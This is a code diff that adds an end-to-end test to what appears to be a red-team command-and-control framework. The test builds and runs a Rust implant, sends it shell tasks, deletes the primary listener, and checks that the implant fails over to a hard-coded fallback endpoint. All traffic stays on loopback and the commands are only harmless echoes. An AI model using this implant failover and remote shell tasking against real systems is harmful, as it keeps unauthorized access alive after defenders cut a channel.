@@ -421,6 +421,134 @@ public class RustImplantEndToEndTests
         Assert.Contains(marker, done.Output);
     }
 
+    /// The egress walk's acceptance (architecture.md Sec 8): a burned front
+    /// must not silence the implant. The artifact enrolls and contacts
+    /// through the primary front, the primary's listener is then deleted
+    /// (its port goes dark), and the next contact walks to the baked
+    /// fallback front -- the same identity, tasking keeps flowing.
+    [RustFact]
+    public async Task RustImplant_WalksToTheFallbackFront_WhenThePrimaryBurns()
+    {
+        await using var env = await TestEnv.StartAsync();
+        await env.CreateEngagementAsync();
+
+        var primaryPort = TestSupport.GetFreeTcpPort();
+        var fallbackPort = TestSupport.GetFreeTcpPort();
+        var primary = await HttpFrontOnPortAsync(env, "walk-primary", primaryPort);
+        await HttpFrontOnPortAsync(env, "walk-fallback", fallbackPort);
+
+        var built = await env.Http.PostAsJsonAsync(
+            $"/engagements/{env.EngagementId}/payloads",
+            new PayloadEndpoints.BuildPayloadRequest(
+                Language: "rust",
+                Class: "Implant",
+                TargetOs: "linux",
+                TargetArch: "amd64",
+                ListenerId: primary,
+                UriPath: null,
+                SleepSeconds: 1.0,
+                JitterSeconds: 0.0,
+                KillDate: null,
+                Mode: "poll",
+                FallbackEndpoints: new List<string> { $"http://127.0.0.1:{fallbackPort}" }));
+        Assert.True(built.IsSuccessStatusCode, await built.Content.ReadAsStringAsync());
+        var artifact = await built.Content.ReadFromJsonAsync<ArtifactBody>();
+        Assert.NotNull(artifact);
+
+        var outDir = Path.Combine(Path.GetTempPath(), "rod-e2e-rust-" + Guid.NewGuid().ToString("N"));
+        Directory.CreateDirectory(outDir);
+        var binaryPath = Path.Combine(outDir, "rod-implant");
+        Process? process = null;
+        try
+        {
+            using (var download = await env.Http.GetAsync(
+                $"/engagements/{artifact!.EngagementId}/payloads/{artifact.ArtifactId}"))
+            {
+                download.EnsureSuccessStatusCode();
+                await File.WriteAllBytesAsync(binaryPath, await download.Content.ReadAsByteArrayAsync());
+            }
+            if (!OperatingSystem.IsWindows())
+            {
+                File.SetUnixFileMode(binaryPath,
+                    UnixFileMode.UserRead | UnixFileMode.UserWrite | UnixFileMode.UserExecute);
+            }
+
+            var stderr = new StringBuilder();
+            process = Process.Start(new ProcessStartInfo
+            {
+                FileName = binaryPath,
+                UseShellExecute = false,
+                RedirectStandardError = true,
+                Environment = { ["ROD_VERBOSE"] = "1" },
+            });
+            Assert.NotNull(process);
+            process!.ErrorDataReceived += (_, e) => { if (e.Data is not null) stderr.AppendLine(e.Data); };
+            process.BeginErrorReadLine();
+
+            var implantId = await WaitForOnlineAsync(env, TimeSpan.FromSeconds(90), stderr);
+            Assert.False(string.IsNullOrEmpty(implantId));
+
+            // The primary carries the first round trip.
+            var firstMarker = "rod-walk-primary-" + Guid.NewGuid().ToString("N")[..8];
+            var first = await env.Http.PostAsJsonAsync(
+                $"/engagements/{env.EngagementId}/tasks",
+                new TaskEndpoints.IssueTaskRequest(implantId, "shell.exec", $"echo {firstMarker}"));
+            first.EnsureSuccessStatusCode();
+            var firstTask = await first.Content.ReadFromJsonAsync<TaskBody>();
+            var firstDone = await WaitForTaskAsync(env, firstTask!.TaskId,
+                body => body.Status == "Completed", stderr, "the primary-front round trip");
+            Assert.Contains(firstMarker, firstDone.Output);
+
+            // The burn: the primary listener is deleted and its port goes
+            // dark; the implant's next contacts must refuse there. The
+            // force flag overrides the dark-implants guard -- going dark is
+            // exactly what this leg proves the walk survives.
+            var burned = await env.Http.DeleteAsync(
+                $"/engagements/{env.EngagementId}/listeners/{primary}?force=true");
+            burned.EnsureSuccessStatusCode();
+
+            // The walk: the failed contacts advance to the fallback front's
+            // dial and the same identity completes the second task through
+            // it -- the fallback serves contact, not enrollment alone.
+            var fallbackMarker = "rod-walk-fallback-" + Guid.NewGuid().ToString("N")[..8];
+            var second = await env.Http.PostAsJsonAsync(
+                $"/engagements/{env.EngagementId}/tasks",
+                new TaskEndpoints.IssueTaskRequest(implantId, "shell.exec", $"echo {fallbackMarker}"));
+            second.EnsureSuccessStatusCode();
+            var secondTask = await second.Content.ReadFromJsonAsync<TaskBody>();
+            var secondDone = await WaitForTaskAsync(env, secondTask!.TaskId,
+                body => body.Status == "Completed", stderr, "the fallback-front round trip");
+            Assert.Equal("Succeeded", secondDone.Outcome);
+            Assert.Contains(fallbackMarker, secondDone.Output);
+        }
+        finally
+        {
+            if (process is { HasExited: false })
+            {
+                try { process.Kill(entireProcessTree: true); } catch { }
+                process.WaitForExit(5000);
+            }
+            process?.Dispose();
+            try { Directory.Delete(outDir, recursive: true); } catch { }
+        }
+    }
+
+    /// Creates the engagement's runtime http listener on the given loopback
+    /// port -- the leg needs the number it dials, both to burn the primary
+    /// and to type the fallback's dial.
+    private static async Task<string> HttpFrontOnPortAsync(TestEnv env, string name, int port)
+    {
+        var created = await env.Http.PostAsJsonAsync(
+            $"/engagements/{env.EngagementId}/listeners",
+            new Rod.Transport.Endpoints.ListenerEndpoints.CreateListenerRequest(
+                Name: name,
+                Transport: "http",
+                BindAddress: $"127.0.0.1:{port}",
+                PublicEndpoint: $"http://127.0.0.1:{port}"));
+        Assert.True(created.IsSuccessStatusCode, await created.Content.ReadAsStringAsync());
+        return (await created.Content.ReadFromJsonAsync<Rod.Transport.Endpoints.ListenerEndpoints.ListenerResponse>())!.Id;
+    }
+
     /// Creates the engagement's runtime dns listener on a free loopback port
     /// and returns its id for the build to name -- the parser resolves the
     /// typed dns dial (the bind as the resolver, the record's zone) from the
